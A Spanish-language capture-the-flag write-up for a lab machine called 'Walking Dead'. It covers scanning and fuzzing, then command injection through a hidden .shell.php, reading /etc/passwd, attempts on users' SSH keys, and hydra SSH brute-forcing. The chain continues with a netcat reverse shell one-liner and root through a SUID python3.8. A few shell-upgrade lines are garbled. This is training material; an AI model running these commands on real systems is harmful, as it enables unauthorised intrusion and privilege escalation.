# WALKING DEAD

> Dificultad: Fácil

___

#### FASE RECONOCIMIENTO

1. **Escaneo**:

1.1 Primero del _Objetivo_:

```
nmap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]
			PORT   STATE SERVICE VERSION                                                      
			22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey:                                                                    
			|   3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)                    
			|   256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)                   
			|_  256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)                 
			80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                               
			|_http-server-header: Apache/2.4.41 (Ubuntu)                                      
			|_http-title: The Walking Dead - CTF                                              
			| http-methods:                                                                   
			|_  Supported Methods: OPTIONS HEAD GET POST                                      
			MAC Address: CE:BF:D6:20:93:90 (Unknown)                                          
			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                           
```

1.2 Ahora que ya sabemos, de la _Web App_:

* `whatweb [IP]`
	* `http://172.18.0.3 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[172.18.0.3], Title[The Walking Dead - CTF]                      

*`nikto -h [IP]`
	+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
	+ /hidden/: Directory indexing found.                      
	+ /hidden/: This might be interesting.                     


2. Ahora pasamos a la Sub-Fase de **Enumeración**:
	
2.1  de la _Web App_:
	* _Directorios:_
		- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://172.18.0.3/FUZZ"`
			- /hidden/	301				
		
	* _Recursos (PHP-HTML-TXT):_
		- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u "http://172.18.0.3/FUZZ"`
		- `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://172.18.0.3/FUZZ.FUZ2Z"`
			- /hidden/.shell.php    0 bytes   <==
			- /index.html
			- /backup.txt							200
				- Error 403: Forbidden. Directory listing is disabled.	?
			
	* Recursos Ocultos:
		* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/UnixDotfiles.fuzz.txt -u "http://172.18.0.3/hidden/FUZZ"`   	X                                   
		* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://172.18.0.3/hidden/.FUZZ"`	X              
		
	* Quizás encontremos _Subdominios_:
		* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -H "Host. FUZZ.[dominio]" -u "http://[dominio|IP]"`	X
						
				
3. **Busqueda de Vulnerabilidades:**
    * _Descargar Lógica PHPs_:
   		* Quizás podamos entender qué hace el script (aunque pesa 0 :S)
			* `curl -O http://[IP]/hidden/.shell.php`	
			* Comprobamos y efectivamente no hay nada.

	* _Parámetros URL_:
	    * Los más comunes:
		    * `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -u "http://[IP]/hidden/.shell.php?FUZZ=1"` 
		    * `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../rockyou.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=1"`
        	* No devueven nada
      
		- Buscamos posible LFI
		    1. `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u "http://[IP]/hidden/.shell.php?FUZZ=FUZ2Z"`
		
		    2. `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=FUZ2Z"`
      		* Tampoco hallamos nada relevante para LFI
					
		* Otros:
		    * `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u "http://[IP]/hidden/.shell.php?FUZZ=id"`
                * cmd 200 

Haciendo distintas pruebas, vemos podemos **Inyectar Comandos del Sistema** a través del _Parámetro URL_. Este es nuestro camino.

___

#### FASE EXPLOTACION
Antes de lanzar nuestra WebShell podemos intentar algunas cosas para intentar hacer _Footprinting_, es decir obtener información más detallada. A través del navegador podemos, por ejemplo:

**Explotación del Sistema**:
	 * _Enumerar Usuarios:_       
		- http://[IP]/hidden/.shell.php?cmd=cat%20/etc/passwd
			- [IMG]
			- rick:     bash
			- negan:    bash

    * _Buscar Claves Privadas_:
        * Navegador:
                * http://[IP]/hidden/.shell.php?cmd=cat%20/home/rick/.ssh/id_rsa    X
                * http://[IP]/hidden/.shell.php?cmd=cat%20/home/negan/.ssh/id_rsa   X
                * No funciona con ningún tipo de clave
    * _Brutear Contraseñas_:
        * hydra -L users.txt -P rockyou.txt ssh://[IP] -t 16 -V -u

Ahora que ya probamos varias cosas sin resultados pasamos a hacer **Footholding** mediante nuestra _Reverse Shell_:

* rlwrap nc -lnvp 6660
	* /hidden/.shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20172.18.0.2%206660%20%3E%2Ftmp%2Ff
 
 * Ahora mejoremos la TTY:
```
which python python3
tty phon3 -c 'import pty;pty.spawn("/bin/bash")'
	* t
	* wami ==> www-data

__```_
		 
#### FASE POST-EXPLOTACIÓN (Elevar Privilegios)
* Listar un poco a los usuarios:
    * ls -Ral /home
        * negan
        * rick
        * wwdata
        * www-data

* cd /home/www-data
* ls -al
* hijack.py
* ls -l hijack.py
    * -rwxr-xr-x 1 root root 111 Feb 11  2025 hijack.py

```
cat hijack.py
-e #!/usr/bin/env python3                                                                      │
import os                                                                                      │
import pty                                                                                     │
os.system("/usr/local/bin/wwwdata_vuln")                                                       │
pty.spawn("/bin/bash") 
```

```
cat /usr/local/bin/wwwdata_vuln
-e #!/bin/bash                 
/bin/bash                      
```
Viendo a simple vista, nos damos cuenta que en realidad este no es el camino. Debemos ir por otro lado.

**Buscar Binarios SUID:**
Una de las primera cosas que hay que hacer para probar **Elevar Privilegios** es hallar estos binarios:

* find / -type f -perm -4000 2>/dev/null
	/usr/lib/openssh/ssh-keysign               
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/bin/man                               
	/usr/bin/gpasswd                           
	/usr/bin/mount                             
	/usr/bin/umount                            
	/usr/bin/chfn                              
	/usr/bin/passwd                            
	/usr/bin/su                                
	/usr/bin/newgrp                            
	/usr/bin/chsh                              
	/usr/bin/python3.8 <===                        
	/usr/bin/sudo                           

Vamos GTFOBins y terminamos corriendo:
* `/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

`whoami` y somos `root`.

___

#### MITIGACIONES
1. Sanear los Parámetros URL
2. Robustecer las contraseñas
3. Cuidado al otorgar permisos SUID a binarios explotables
